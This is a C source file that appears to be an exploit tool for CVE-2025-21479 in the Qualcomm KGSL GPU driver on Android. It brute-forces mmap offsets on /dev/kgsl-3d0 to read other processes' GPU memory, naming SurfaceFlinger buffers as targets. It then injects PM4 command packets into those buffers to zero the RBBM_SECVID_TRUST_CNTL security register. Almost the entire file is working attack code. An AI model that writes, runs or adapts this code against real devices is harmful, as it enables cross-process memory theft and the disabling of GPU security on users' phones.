/*
 * global_gpu_scan.c - global GPU address space scanner
 *
 * The CVE-2025-21479 offset is based on the global GPU page index:
 * - GPU base address: 0x4000000000
 * - page_index = (gpuaddr - 0x4000000000) / 0x1000
 * - mmap offset = (page_index + 1) * 0x1000
 *
 * This tool scans a wide offset range to find other processes' GPU memory
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>
#include <time.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_addr;
    uint64_t mmapsize;
    uint32_t id;
    uint32_t padding;
};

struct kgsl_gpuobj_free
{
    uint64_t flags;
    uint32_t id;
    uint32_t type;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

#define KGSL_CACHEMODE_WRITEBACK 0x00000C00

/* PM4 Opcodes */
#define CP_NOP 0x10
#define CP_IB 0x3F
#define CP_MEM_WRITE 0x3D
#define CP_REG_WRITE 0x3C
#define CP_WAIT_IDLE 0x26
#define CP_DRAW_INDX 0x22
#define CP_EVENT 0x46

/* Security Registers */
#define RBBM_SECVID_TRUST_CNTL 0x0F400
#define CP_PROTECT_CNTL 0x0084C

#define PKT3(op, cnt) (0xC0000000 | (((cnt) - 1) << 16) | ((op) << 8))
#define PKT4(reg, cnt) (0x40000000 | ((cnt) & 0x7F) | (((reg) & 0x3FFFF) << 8))

static volatile int running = 1;
static int kgsl_fd = -1;
static uint32_t alloc_id = 0;

static void cleanup(void)
{
    if (alloc_id && kgsl_fd >= 0)
    {
        struct kgsl_gpuobj_free f = {0};
        f.id = alloc_id;
        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
    }
    if (kgsl_fd >= 0)
        close(kgsl_fd);
}

static void sigint_handler(int sig)
{
    (void)sig;
    running = 0;
}

static int alloc_gpu_mem(void)
{
    struct kgsl_gpuobj_alloc a = {0};
    a.size = 4096;
    a.flags = KGSL_CACHEMODE_WRITEBACK;

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0)
    {
        printf("[-] GPUOBJ_ALLOC failed: %s\n", strerror(errno));
        return -1;
    }

    alloc_id = a.id;
    printf("[+] GPU alloc: id=%u, gpuaddr=0x%lx\n", alloc_id, (unsigned long)a.va_addr);
    return 0;
}

/* Try mmap at offset */
static void *try_mmap(uint64_t offset)
{
    return mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, offset);
}

/* Check PM4 content */
static int check_pm4(const uint32_t *buf, int *pm4, int *ib, int *nop, int *draw)
{
    *pm4 = 0;
    *ib = 0;
    *nop = 0;
    *draw = 0;

    for (int i = 0; i < 1024;)
    {
        uint32_t h = buf[i];
        if (h == 0)
        {
            i++;
            continue;
        }

        if ((h & 0xC0000000) == 0xC0000000)
        {
            int op = (h >> 8) & 0xFF;
            int cnt = ((h >> 16) & 0x3FFF) + 1;
            (*pm4)++;
            if (op == CP_NOP)
                (*nop)++;
            else if (op == CP_IB)
                (*ib)++;
            else if (op == CP_DRAW_INDX)
                (*draw)++;
            i += 1 + cnt;
        }
        else if ((h & 0xF0000000) == 0x70000000)
        {
            (*pm4)++;
            i += 1 + (h & 0xFFFF);
        }
        else if ((h & 0xF0000000) == 0x40000000)
        {
            (*pm4)++;
            i += 1 + (h & 0x7F) + 1;
        }
        else
        {
            i++;
        }
    }

    return *pm4 > 5;
}

/* Massive scan */
static void massive_scan(uint64_t start, uint64_t end, uint64_t step)
{
    printf("\n[*] Massive GPU address space scan\n");
    printf("[*] Range: 0x%lx - 0x%lx (step 0x%lx)\n",
           (unsigned long)start, (unsigned long)end, (unsigned long)step);
    printf("[*] This corresponds to GPU addresses 0x%lx - 0x%lx\n",
           (unsigned long)(0x4000000000ULL + (start / 0x1000 - 1) * 0x1000),
           (unsigned long)(0x4000000000ULL + (end / 0x1000 - 1) * 0x1000));
    printf("[*] Press Ctrl+C to stop\n\n");

    signal(SIGINT, sigint_handler);

    int checked = 0, mapped = 0, pm4_found = 0;
    time_t start_time = time(NULL);

    for (uint64_t off = start; off < end && running; off += step)
    {
        void *addr = try_mmap(off);
        checked++;

        if (addr != MAP_FAILED)
        {
            mapped++;

            /* Check for non-zero */
            const uint32_t *buf = (const uint32_t *)addr;
            int has_data = 0;
            for (int i = 0; i < 256; i++)
            {
                if (buf[i] != 0)
                {
                    has_data = 1;
                    break;
                }
            }

            if (has_data)
            {
                int pm4, ib, nop, draw;
                if (check_pm4(buf, &pm4, &ib, &nop, &draw))
                {
                    pm4_found++;

                    uint64_t gpuaddr = 0x4000000000ULL + (off / 0x1000 - 1) * 0x1000;
                    printf("\n[+] PM4 BUFFER @ offset=0x%lx (gpuaddr=0x%lx)\n",
                           (unsigned long)off, (unsigned long)gpuaddr);
                    printf("    PM4=%d, IB=%d, NOP=%d, DRAW=%d\n", pm4, ib, nop, draw);

                    /* If injectable */
                    if (nop > 0)
                    {
                        printf("    [!] HAS NOP - INJECTABLE!\n");

                        /* Find NOP and inject */
                        for (int i = 0; i < 512; i++)
                        {
                            if ((buf[i] & 0xFF00FF00) == 0xC0001000)
                            { /* CP_NOP Type3 */
                                int cnt = ((buf[i] >> 16) & 0x3FFF) + 1;
                                if (cnt >= 8)
                                {
                                    printf("    [!] NOP at +0x%x (space=%d)\n", i * 4, cnt);

                                    /* INJECT! */
                                    uint32_t *wbuf = (uint32_t *)addr;
                                    wbuf[i] = PKT3(CP_WAIT_IDLE, 1);
                                    wbuf[i + 1] = 0;
                                    wbuf[i + 2] = PKT3(CP_REG_WRITE, 2);
                                    wbuf[i + 3] = RBBM_SECVID_TRUST_CNTL;
                                    wbuf[i + 4] = 0; /* Disable trust */
                                    wbuf[i + 5] = PKT3(CP_NOP, 1);
                                    wbuf[i + 6] = 0xDEADC0DE;
                                    __sync_synchronize();

                                    if (wbuf[i + 6] == 0xDEADC0DE)
                                    {
                                        printf("    [!!!] PAYLOAD INJECTED!\n");
                                    }
                                    break;
                                }
                            }
                        }
                    }

                    /* Print first 16 dwords */
                    printf("    Data: ");
                    for (int i = 0; i < 8; i++)
                    {
                        printf("%08x ", buf[i]);
                    }
                    printf("...\n");
                }
            }

            munmap(addr, 4096);
        }

        if (checked % 10000 == 0)
        {
            int elapsed = (int)(time(NULL) - start_time);
            printf("\r[*] %d checked, %d mapped, %d PM4 (%ds elapsed, %.0f pages/sec)    ",
                   checked, mapped, pm4_found, elapsed,
                   elapsed > 0 ? (float)checked / elapsed : 0);
            fflush(stdout);
        }
    }

    printf("\n\n[*] Scan complete\n");
    printf("[*] Checked: %d, Mapped: %d, PM4 buffers: %d\n", checked, mapped, pm4_found);
}

/* Brute force all possible offsets in chunks */
static void brute_force_scan(void)
{
    /*
     * SurfaceFlinger typically allocates large GPU buffers
     * GPU address space is 0x4000000000 - 0x4FFFFFFFFF (256GB)
     * We need to scan offset = (page_index + 1) * 0x1000
     * where page_index can be very large
     *
     * Let's scan in practical ranges:
     * - Low range: 0x1000 - 0x1000000 (16MB, common)
     * - Mid range: 0x1000000 - 0x10000000 (256MB, graphics)
     * - High range: up to 0x100000000 (4GB, large allocations)
     */

    printf("\n=== PHASE 1: Low range (0x1000 - 0x1000000) ===\n");
    massive_scan(0x1000, 0x1000000, 0x1000);

    if (!running)
        return;

    printf("\n=== PHASE 2: Mid range (0x1000000 - 0x10000000) ===\n");
    massive_scan(0x1000000, 0x10000000, 0x10000); /* 64KB step */

    if (!running)
        return;

    printf("\n=== PHASE 3: High range (0x10000000 - 0x100000000) ===\n");
    massive_scan(0x10000000, 0x100000000ULL, 0x100000); /* 1MB step */
}

/* Targeted scan based on likely SF buffer locations */
static void targeted_scan(void)
{
    printf("\n=== Targeted SurfaceFlinger Buffer Scan ===\n");
    printf("[*] SurfaceFlinger typically uses:\n");
    printf("    - Framebuffer: ~20MB per buffer\n");
    printf("    - Command buffers: 4KB-64KB each\n");
    printf("    - Scratch: 1MB-4MB\n\n");

    /* These offsets correspond to likely GPU addresses */
    uint64_t targets[] = {
        /* Common small allocations */
        0x1000, 0x2000, 0x3000, 0x4000, 0x5000,
        0x10000, 0x20000, 0x30000, 0x40000, 0x50000,
        0x100000, 0x200000, 0x300000, 0x400000, 0x500000,

        /* Framebuffer-sized (1920*1080*4 = ~8MB, 2x = ~16MB, 3x = ~24MB) */
        0x800000,  /* 8MB */
        0x1000000, /* 16MB */
        0x1800000, /* 24MB */
        0x2000000, /* 32MB */

        /* Large allocations */
        0x4000000,  /* 64MB */
        0x8000000,  /* 128MB */
        0x10000000, /* 256MB */
        0x20000000, /* 512MB */

        0};

    signal(SIGINT, sigint_handler);

    for (int i = 0; targets[i] && running; i++)
    {
        uint64_t off = targets[i];
        void *addr = try_mmap(off);

        if (addr != MAP_FAILED)
        {
            const uint32_t *buf = (const uint32_t *)addr;
            int has_data = 0;
            for (int j = 0; j < 256; j++)
            {
                if (buf[j] != 0)
                {
                    has_data = 1;
                    break;
                }
            }

            uint64_t gpuaddr = 0x4000000000ULL + (off / 0x1000 - 1) * 0x1000;

            if (has_data)
            {
                int pm4, ib, nop, draw;
                check_pm4(buf, &pm4, &ib, &nop, &draw);

                printf("[+] 0x%08lx (gpu=0x%lx): ", (unsigned long)off, (unsigned long)gpuaddr);
                if (pm4 > 5)
                {
                    printf("PM4=%d IB=%d NOP=%d DRAW=%d", pm4, ib, nop, draw);
                    if (nop > 0)
                        printf(" [INJECTABLE]");
                }
                else
                {
                    printf("DATA (first 4: %08x %08x %08x %08x)",
                           buf[0], buf[1], buf[2], buf[3]);
                }
                printf("\n");
            }
            else
            {
                printf("[ ] 0x%08lx (gpu=0x%lx): mapped but empty\n",
                       (unsigned long)off, (unsigned long)gpuaddr);
            }

            munmap(addr, 4096);
        }
    }
}

int main(int argc, char *argv[])
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2025-21479 Global GPU Address Space Scanner                      ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════════╝\n\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open KGSL: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] KGSL fd: %d\n", kgsl_fd);

    atexit(cleanup);

    if (alloc_gpu_mem() < 0)
        return 1;

    if (argc < 2)
    {
        printf("\nUsage: %s <mode> [options]\n", argv[0]);
        printf("  brute      - Full brute force scan (slow)\n");
        printf("  targeted   - Targeted SF buffer locations\n");
        printf("  range <start> <end> <step> - Custom range scan\n");
        return 1;
    }

    if (strcmp(argv[1], "brute") == 0)
    {
        brute_force_scan();
    }
    else if (strcmp(argv[1], "targeted") == 0)
    {
        targeted_scan();
    }
    else if (strcmp(argv[1], "range") == 0)
    {
        if (argc < 5)
        {
            printf("[-] Need start, end, step\n");
            return 1;
        }
        uint64_t start = strtoull(argv[2], NULL, 0);
        uint64_t end = strtoull(argv[3], NULL, 0);
        uint64_t step = strtoull(argv[4], NULL, 0);
        massive_scan(start, end, step);
    }
    else
    {
        printf("[-] Unknown mode\n");
    }

    return 0;
}
